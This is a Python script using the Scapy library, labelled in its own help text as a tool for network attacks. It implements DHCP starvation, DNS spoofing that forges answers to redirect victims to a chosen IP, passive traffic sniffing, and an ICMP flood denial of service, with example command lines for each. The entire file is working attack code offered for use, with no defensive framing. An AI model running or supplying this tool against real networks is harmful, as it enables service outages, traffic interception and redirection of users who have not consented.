import argparse
import textwrap
from scapy.all import *

class Scaper:
    def __init__(self):
        self.interface = None
        self.target_ip = None
        self.spoofed_ip = None

    def dhcp_starvation(self):
        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr="".join([chr(randint(0, 255)) for _ in range(6)])) / DHCP(options=[("message-type", "discover"), "end"])
        sendp(dhcp_discover, iface=self.interface, loop=1, verbose=False)

    def dns_spoofing(self):
        def dns_responder(pkt):
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport, sport=53) / DNS(
                    id=pkt[DNS].id, qr=1, aa=1, qdcount=1, ancount=1, qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.spoofed_ip))
                send(spoofed_pkt, verbose=False)

        sniff(iface=self.interface, filter="udp port 53", prn=dns_responder)

    def sniff_traffic(self):
        sniff(iface=self.interface, prn=lambda x: x.summary())

    def dos_attack(self):
        target = self.target_ip
        ip = IP(dst=target)
        icmp = ICMP()
        pkt = ip / icmp
        send(pkt, loop=1, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="Scapy-based tool for network attacks", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent("""
    Example usage:
    # Perform DHCP starvation attack
    python scaper.py --interface eth0 --dhcp-starvation

    # Perform DNS spoofing attack
    python scaper.py --interface eth0 --dns-spoofing --spoofed-ip 192.168.1.1

    # Sniff network traffic
    python scaper.py --interface eth0 --sniff-traffic

    # Perform DoS attack
    python scaper.py --interface eth0 --dos-attack --target-ip 192.168.1.100
    """))

    parser.add_argument("--interface", help="Network interface to use")
    parser.add_argument("--target-ip", help="Target IP address")
    parser.add_argument("--spoofed-ip", help="Spoofed IP address for DNS spoofing")
    parser.add_argument("--dhcp-starvation", action="store_true", help="Perform DHCP starvation attack")
    parser.add_argument("--dns-spoofing", action="store_true", help="Perform DNS spoofing attack")
    parser.add_argument("--sniff-traffic", action="store_true", help="Sniff network traffic")
    parser.add_argument("--dos-attack", action="store_true", help="Perform DoS attack")

    args = parser.parse_args()

    scaper = Scaper()
    scaper.interface = args.interface
    scaper.target_ip = args.target_ip
    scaper.spoofed_ip = args.spoofed_ip

    if args.dhcp_starvation:
        scaper.dhcp_starvation()

    if args.dns_spoofing:
        scaper.dns_spoofing()

    if args.sniff_traffic:
        scaper.sniff_traffic()

    if args.dos_attack:
        scaper.dos_attack()

if __name__ == "__main__":
    main()
